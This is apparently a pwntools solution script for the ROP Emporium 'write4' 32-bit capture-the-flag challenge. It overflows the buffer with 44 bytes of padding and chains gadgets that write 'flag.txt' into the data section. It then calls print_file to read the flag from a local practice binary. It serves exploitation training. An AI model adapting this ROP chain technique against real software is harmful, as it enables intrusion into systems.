from pwn import *

elf = context.binary = ELF('/home/saudi/Desktop/CTF/CTF scripts/Pwn/RopEmporium/write4/write32/write432')



#bytes to reach the EIP
padding = b"A" *44

#we find the pop gadget and mov gadget
# info(str(elf.symbols.data_start))
rop = ROP(elf)
pop_gadget = rop.find_gadget(['pop edi', 'pop ebp', 'ret'])[0]
info("%#x pop gadget", pop_gadget )
mov_gadget = elf.symbols.usefulGadgets
info("%#x mov gadget", mov_gadget )
data_section = elf.symbols.data_start
info("%#x data section", data_section )

rop.raw([pop_gadget,data_section, "flag", mov_gadget ])

rop.raw([pop_gadget,data_section + 0x4, ".txt", mov_gadget ])
rop.print_file(data_section)
rop_chain  = rop.chain()
info("rop chain: %r", rop_chain)

io = process(elf.path)
io.recvuntil('> ')
exploit = padding + rop_chain
io.sendline(exploit)
flag = io.recvall()
success(flag)

